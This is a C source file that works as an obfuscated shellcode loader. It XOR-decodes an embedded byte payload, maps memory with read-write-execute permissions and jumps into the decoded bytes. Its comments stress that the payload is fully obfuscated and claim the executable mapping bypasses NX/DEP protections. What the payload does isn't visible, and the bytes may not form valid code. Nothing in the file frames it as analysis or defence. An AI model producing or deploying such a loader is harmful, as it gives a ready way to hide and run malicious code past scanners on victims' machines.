#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    // 1. Raw assembly instructions + payload data, entirely obfuscated.
    // Every single byte is XOR-encoded with 0xAA. No raw \x00 bytes present.
    unsigned char payload[] = 
        "\x62\xec\x25\xaa\xaa\xaa\xaa\xc2\xcc\xc7\xde\xc2\xcc\xc4\xdf"
        "\xc2\xcc\xc5\xdc\xe2\xc2\xd2\x25\x21\x21\xaa\xaa\xeb\x9a\xf4"
        "\xe1\xee\xa8\x1e\xe1\xee\x6b\xaa\xe3\xd6\xe2\xda\x22\xba\x31"
        "\xe3\xf2\xec\xd2\x25\x21\x21\xaa\xaa\x4f\x31\xeb\x9a\xf4\x6b"
        "\x4a\x9d\x9c\x97\x8e\x90\x8e\x90\x8e\x9b\xc2\xde\x25\xaa\xaa"
        "\xaa\xaa\xeb\x9a\xf4\xe2\xcc\xe6\xc2\xcc\x95\x85\x95\xc2\xc5"
        "\x25\xaa\xaa\xaa\xaa\xeb\x9a\xf4\xeb\xb3\xcc\x9d\xdd\xd5\xd4"
        "\xd5\xc3\xdc\xaa";

    size_t payload_len = sizeof(payload) - 1;

    // 2. Decode the payload back into active machine code instructions
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] = payload[i] ^ 0xAA;
    }

    // 3. Allocate a memory page aligned specifically for execution permissions
    // This bypasses NX/DEP protections that would cause stack corruption errors.
    void *exec_mem = mmap(NULL, payload_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        return 1;
    }

    // 4. Move the decrypted assembly instructions into our executable buffer
    memcpy(exec_mem, payload, payload_len);

    // 5. Cast the buffer to a function pointer type and execute it directly
    void (*run_shellcode)() = (void (*)())exec_mem;
    run_shellcode();

    return 0;
}
